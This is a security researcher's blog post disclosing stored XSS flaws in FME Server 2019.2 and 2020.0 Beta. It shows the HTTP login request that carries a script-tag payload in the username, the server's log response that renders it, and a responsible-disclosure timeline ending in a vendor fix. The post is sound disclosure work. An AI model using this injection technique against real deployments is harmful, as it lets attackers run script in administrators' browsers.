=== Content from mexicanpentester.com_b26e8fea_20250119_114233.html ===

[[email¬†protected]](/cdn-cgi/l/email-protection#3240725f574a5b51535c42575c4657414657401c515d5f)

* [Facebook](https://www.linkedin.com/in/sanchezmarchand/)
* [Twitter](https://twitter.com/ric_rojo)

* [Facebook](https://www.linkedin.com/in/sanchezmarchand/)
* [Twitter](https://twitter.com/ric_rojo)

[![Ricardo Sanchez Marchand](https://mexicanpentester.com/wp-content/uploads/2020/07/circle-cropped.png)](https://mexicanpentester.com/)

* [Yo / Me](https://mexicanpentester.com/yo-me/)
  + [Certificaciones](https://mexicanpentester.com/yo-me/)
  + [Libros / Books](https://mexicanpentester.com/libros-books/)
* [Blog](https://mexicanpentester.com/category/blog/)
* [Herramientas / tools](https://mexicanpentester.com/category/herramientas-tools/)
  + [AWS tools](https://mexicanpentester.com/category/aws-tools/)
  + [Azure tools](https://mexicanpentester.com/category/azure-tools/)
* [OSCP](https://mexicanpentester.com/category/oscp/)
* [Cloud](https://mexicanpentester.com/category/cloud/)
  + [AWS tools](https://mexicanpentester.com/category/aws-tools/)
  + [Azure tools](https://mexicanpentester.com/category/azure-tools/)
* [Linkedin / Contacto](https://www.linkedin.com/in/sanchezmarchand)

Select Page

# Vulnerabilities in FME Server versions 2019.2 and 2020.0 Beta (and probably previous versions)

by [Ric](https://mexicanpentester.com/author/admin/ "Posts by Ric") | Apr 9, 2020 | [Blog](https://mexicanpentester.com/category/blog/)

While doing our work in [Secura](https://www.secura.com/), [David Van Gool](https://www.linkedin.com/in/davidvangool/) and I recently found and reported two vulnerabilities in [FME Server](https://www.safe.com/fme/fme-server/) versions 2019.2 and 2020.0 Beta.

The vulnerabilities were:

1. Unauthenticated Stored XSS
2. Authenticated Stored XSS

The Unauthenticated Stored XSS injection parameter was in the username of the main login portal and was executed in the logs.

To test this, the following requests attempts to log in the user with the malicious username.

```
POST /fmeserver/login/now HTTP/1.1
Host: fme.acc.redacted.nl
[...]
referer =%2 Ffmeserver &username =%3Cscript%3Ealert%28%22XSS+in+Login%22%29%3C%2Fscript
%3E&password =
```

The server accepted it with a 200

```
HTTP /1.1 200 OK
[...]
```

If an Administrator navigates to the log page at https://fme.acc.redacted.nl/fmeserver/#/systemevents/history?page=1 and views the event above, the following would be returned by the server.

```
HTTP/1.1 200 OK
Content -Type: application /json;charset=UTF -8
X-Powered -By: ARR /3.0
Date: Mon , 02 Mar 2020 14:23:11 GMT
Connection : close
Content -Length: 37250
{" offset ":0 ," limit ":100 ," totalCount ":1396 ," items ":[{" dateFinished ":"2020 -03 -02 T15
:22:43+01:00" ," name ":" SYSTEMEVENT_LOGIN_FAILURE "," header ":{" systemEvent . description
":" Failed login on web interface ."," source ":" system -event "," time ":"2020 -03 -02 T15
:22:43+01:00" ," user ":
```

**‚Äú<script >alert(\‚ÄùXSS in Login\‚Äù) <\/script >**

```
"," systemEvent .title
":" Failed Login "},"id ":7439 ," body ":" Failed login by user <script >alert(\"XSS in
Login\") <\/script > due to insufficient credentials ."}
```

The exact same thing happens with the Name field while creating/deleting/- modifying users.

Throughout all the application they were using JSON to display information, I guess that to prevent this but in the logs the information was rendered as HTML without any output encoding, therefore executing the malicious payload.

### Reporting the vulnerability.

As part of Secura Responsible disclosure the vulnerability was reported last month to the vendor and was fixed in the following versions

There was a form in their website, I submitted a bug report with a redacted pdf and got an automatic email:

‚Äî‚Äî‚Äî‚Äî

![](https://mexicanpentester.com/wp-content/uploads/2020/04/sutomatic-700x343.png)

‚Äî‚Äî‚Äî‚Äî-

Same day I got an email confirming the vuln

![](https://mexicanpentester.com/wp-content/uploads/2020/04/same-day-700x430.png)

‚Äî‚Äî‚Äî‚Äî-

Then they closed the ticket

![](https://mexicanpentester.com/wp-content/uploads/2020/04/close-ticket.png)

‚Äî‚Äî‚Äî‚Äî-

And finally they confirmed the fix üôÇ

![](https://mexicanpentester.com/wp-content/uploads/2020/04/Screen-Shot-2021-04-29-at-18.20.01-700x692.png)

‚Äî‚Äî‚Äî‚Äî

In general they were very helpful during the process.

Search for:

 .
#### Recent Posts

* [How to do Cloud Security assessments like a pro in only #4Steps ( DEFCON 2022)](https://mexicanpentester.com/2022/08/15/how-to-do-cloud-security-assessments-like-a-pro-in-only-4steps-defcon-2022/)
* [CCISO Domain 02: INFORMATION SECURITY CONTROLS, COMPLIANCE, AND AUDIT MANAGEMENT](https://mexicanpentester.com/2022/03/13/cciso-domain-02-information-security-controls-compliance-and-audit-management/)
* [CCISO Domain 01: GOVERNANCE AND RISK MANAGEMENT](https://mexicanpentester.com/2022/03/07/cciso-domain-01-governance-and-risk-management/)
* [Un documental de la historia de Kubernetes super interesante](https://mexicanpentester.com/2022/01/22/un-documental-de-la-historia-de-kubernetes-super-interesante/)
* [Kubernetes nombres cortos para el CLI](https://mexicanpentester.com/2021/11/12/kubernetes-nombres-cortos-para-el-cli/)

#### Categories

* [AWS tools](https://mexicanpentester.com/category/aws-tools/)
* [Azure tools](https://mexicanpentester.com/category/azure-tools/)
* [Blog](https://mexicanpentester.com/category/blog/)
* [CISO](https://mexicanpentester.com/category/ciso/)
* [Cloud](https://mexicanpentester.com/category/cloud/)
* [Herramientas / tools](https://mexicanpentester.com/category/herramientas-tools/)
* [Memes](https://mexicanpentester.com/category/memes/)
* [News](https://mexicanpentester.com/category/news/)
* [OSCP](https://mexicanpentester.com/category/oscp/)
 [![](https://mexicanpentester.com/wp-content/uploads/2019/02/ninja_metasploit-300x300.png)](https://github.com/rapid7/metasploit-framework)
#### Tag cloud

[500](https://mexicanpentester.com/tag/500/)
[active directory](https://mexicanpentester.com/tag/active-directory/)
[ad](https://mexicanpentester.com/tag/ad/)
[architect](https://mexicanpentester.com/tag/architect/)
[AWS](https://mexicanpentester.com/tag/aws/)
[aws security speciality](https://mexicanpentester.com/tag/aws-security-speciality/)
[azure](https://mexicanpentester.com/tag/azure/)
[CCSK](https://mexicanpentester.com/tag/ccsk/)
[Certified secure](https://mexicanpentester.com/tag/certified-secure/)
[CISM](https://mexicanpentester.com/tag/cism/)
[cloud](https://mexicanpentester.com/tag/cloud/)
[course](https://mexicanpentester.com/tag/course/)
[curso](https://mexicanpentester.com/tag/curso/)
[enumeration](https://mexicanpentester.com/tag/enumeration/)
[hack the box](https://mexicanpentester.com/tag/hack-the-box/)
[hashcat](https://mexicanpentester.com/tag/hashcat/)
[htb](https://mexicanpentester.com/tag/htb/)
[IAM](https://mexicanpentester.com/tag/iam/)
[kubernetes](https://mexicanpentester.com/tag/kubernetes/)
[linux](https://mexicanpentester.com/tag/linux/)
[live pwk](https://mexicanpentester.com/tag/live-pwk/)
[mail](https://mexicanpentester.com/tag/mail/)
[metasploit](https://mexicanpentester.com/tag/metasploit/)
[msfvenom](https://mexicanpentester.com/tag/msfvenom/)
[oscp](https://mexicanpentester.com/tag/oscp/)
[owasp](https://mexicanpentester.com/tag/owasp/)
[password](https://mexicanpentester.com/tag/password/)
[pentest](https://mexicanpentester.com/tag/pentest/)
[Pentester Academy](https://mexicanpentester.com/tag/pentester-academy/)
[pentesting](https://mexicanpentester.com/tag/pentesting/)
[phishing](https://mexicanpentester.com/tag/phishing/)
[powershell](https://mexicanpentester.com/tag/powershell/)
[privilege escalation](https://mexicanpentester.com/tag/privilege-escalation/)
[real life](https://mexicanpentester.com/tag/real-life/)
[red teaming](https://mexicanpentester.com/tag/red-teaming/)
[SAA-CO2](https://mexicanpentester.com/tag/saa-co2/)
[shell](https://mexicanpentester.com/tag/shell/)
[smb](https://mexicanpentester.com/tag/smb/)
[ubuntu](https://mexicanpentester.com/tag/ubuntu/)
[vida real](https://mexicanpentester.com/tag/vida-real/)
[web](https://mexicanpentester.com/tag/web/)
[web application](https://mexicanpentester.com/tag/web-application/)
[web pentest](https://mexicanpentester.com/tag/web-pentest/)
[windows](https://mexicanpentester.com/tag/windows/)
[xss](https://mexicanpentester.com/tag/xss/)

[![Member of The Internet Defense League](https://mexicanpentester.com/wp-content/plugins/jetpack/modules/widgets/internet-defense-league/shield_badge.png)](https://www.fightforthefuture.org/)

* [Facebook](https://www.linkedin.com/in/sanchezmarchand/)
* [Twitter](https://twitter.com/ric_rojo)

Ricardo Sanchez

Usamos cookies para mejorar la experiencia. En general, asumimos que no te importar√° mucho, pero puedes rechazarlas expresamente si lo prefieres.

Aceptar . RechazarPrivacidad & Cookies

Close

#### Privacy Overview

This website uses cookies to improve your experience while you navigate through the website. Out of these, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may affect your browsing experience.

Necessary

Necessary

Always Enabled

Necessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.

Non-necessary

Non-necessary

Any cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website.

SAVE & ACCEPT


